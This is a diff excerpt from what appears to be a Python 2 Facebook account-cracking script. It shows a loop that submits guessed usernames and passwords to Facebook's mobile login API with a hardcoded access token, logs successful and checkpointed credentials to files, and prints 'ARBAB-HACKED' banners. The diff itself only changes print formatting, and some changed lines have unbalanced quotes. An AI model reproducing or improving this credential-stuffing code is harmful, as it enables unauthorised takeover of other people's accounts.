@@ -240,14 +240,14 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;91mARBAB-HACKED\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2+'\n'+"\n
+						print '\x1b[1;91mARBAB-HACKED\x1b[1;97m-\x1b[1;93m✙\x1b[0m ' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2+'\n'+"\n
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\x1b[1;94mMEMON-OFLINE🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c +user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2+'\n'+"\
+							print '\x1b[1;94mMEMON-OFLINE🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c +user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2+'\n'+"\n
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -264,7 +264,7 @@ def action():
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;94mMEMON-OFLINE🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3+'\n'
+									print '\x1b[1;94mMEMON-OFLINE🗝\x1b[1;95m-\x1b[1;93m✙\x1b[0m' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3+'\n'+"\n
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
